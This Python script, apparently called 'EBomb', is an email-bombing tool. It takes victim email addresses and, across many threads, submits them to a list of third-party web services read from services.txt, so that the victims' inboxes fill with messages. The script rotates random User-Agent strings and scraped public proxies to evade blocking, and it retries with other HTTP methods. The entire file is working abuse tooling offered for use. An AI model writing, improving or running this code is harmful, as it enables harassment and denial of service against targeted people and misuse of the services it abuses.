from time import sleep
from threading import Thread
from random import choice, randint
from argparse import ArgumentParser
from urllib.request import Request, urlopen

from ua import randomUA
from proxyscan import ProxyScanIO  # git clone https://github.com/NIKDISSV-Forever/proxyscan

__banner__ = r"""
  ______ ____                  _
 |  ____|  _ \                | |
 | |__  | |_) | ___  _ __ ___ | |__
 |  __| |  _ < / _ \| '_ ` _ \| '_ \
 | |____| |_) | (_) | | | | | | |_) |
 |______|____/ \___/|_| |_| |_|_.__/
 """

servicesFile = "services.txt"

with open(servicesFile, "r") as f:
    SERVS = sorted((i.split() for i in f.read().split("\n")))

class main:
    
    def __init__(self) -> None:
        self.parseArgs()
        self.argsInit()
        Thread(target=self.startBomb, daemon=True).start()
        
    
    def parseArgs(self) -> None:
        parser = ArgumentParser()
        parser.add_argument("-E", "--emails", type=str,
                            help="Email address(es) (separated by a space)")
        parser.add_argument("-T", "--threads", type=int,
                            help="Number of threads")
        parser.add_argument("-X", "--proxy", action="store_true",
                            help="Whether to use a proxy.")
        parser.add_argument("-D", "--duration", type=int,
                            default=0,
                            help="Spam duration.")
        self.args = parser.parse_args()
    
    def argsInit(self) -> None:
        if self.args.emails:
            self.emails = self.args.emails
        else:
            self.askEmails()
        if self.args.threads:
            self.threads = self.args.threads
        else:
            self.askThreads()
        if self.args.proxy:
            self.proxy = self.args.proxy
            self.proxies = None
        else:
            self.askUseProxy()
        if self.args.duration:
            self.duration = self.args.duration
        else:
            self.askDuration()
    def askDuration(self):
        try:
            self.duration = int(input("Spam duration (0): "))
        except ValueError:
            self.duration = 0
            
    def askUseProxy(self) -> None:
        self.proxy = not input("Use a proxy? (If yes, just press Enter) ")
    
    def askEmails(self) -> None:
        emails = ""
        while not emails:
            tmp = input("Email address(es) (separated by a space): ").strip()
            if tmp:
                emails = tmp
        self.emails = tuple(emails.split())
    
    def askThreads(self) -> None:
        threads = 10
        tmp = input(f"Number of threads ({threads}): ").strip()
        try:
            threads = int(tmp)
        except ValueError:
            pass
        self.threads = threads
    
    find_proxy = False
    proxies = []
    def bomb(self) -> None:
        ua = {"User-Agent": randomUA()}
        for url in SERVS:
            for email in self.emails:
                if not len(self.proxies) and self.proxy:
                    if not self.find_proxy:
                        self.find_proxy = True
                        print("\033[36mCollecting new proxies...")
                        self.getProxies()
                        print("New proxies have been collected.\033[0m")
                    else:
                        while self.find_proxy:
                            sleep(0.0)
                    self.find_proxy = False
    
                ip = None
                ip_col = "\033[32m"
                while True:
                    req = Request(url[0] % email, headers=ua, method=url[1])
                    if self.proxy:
                        ip = choice(self.proxies)
                        req.set_proxy(ip, type="http")
                    try:
                        resp = urlopen(req)
                        code = resp.getcode()
                        break
                    except Exception as Error:
                        if hasattr(Error, "getcode"):
                            code = Error.getcode()
                            if url[1] == "GET":
                                url[1] = "POST"
                                continue
                        else:
                            code = str(Error)
                            if ip in self.proxies:
                                self.proxies.remove(ip)
                                ip_col = "\033[31m"
                        break
                code_col = "\033[31m"
                serv_col = "\033[32m"
                if isinstance(code, int):
                    if 403 < code < 500:
                        if url in SERVS:
                            SERVS.remove(url)
                        serv_col = "\033[31m"
                    elif 200 <= code <= 400:
                        code_col = "\033[32m"
                email_t = email.split("@")[0]
                url_t = url[0].split("/")[2].split(".")[1]
                print(
                    f"{code_col}{code}\033[0m | {email_t} | {serv_col}{url[1]} {url_t}\033[0m",
                    end="")
                if ip:
                    print(f" | {ip_col}{ip}\033[0m", end="")
                print()
    
    threads_list = ()
    
    def startBomb(self) -> None:
        for _ in range(self.threads):
            self.threads_list += Thread(target=self.bomb, daemon=True),
            self.threads_list[-1].start()
    
    def needCountProxy(self) -> int:
        return len(self.emails) * self.threads
    
    def getProxies(self) -> None:
        scanner = ProxyScanIO()
        count = self.needCountProxy()
        self.proxies = list(set(scanner.get_proxies(count=count, type="http")))

    def end(self):
        with open(servicesFile, "w") as f:
            f.write("\n".join((" ".join(i) for i in SERVS)))


if __name__ == "__main__":
    print(f"\033[{randint(30, 37)}m{__banner__}\033[0m\033[1m{len(SERVS)}\033[0m")
    process = main()
    if process.duration != 0:
        sleep(process.duration)
        print("\033[36mEnding spam...")
        process.end()
        del process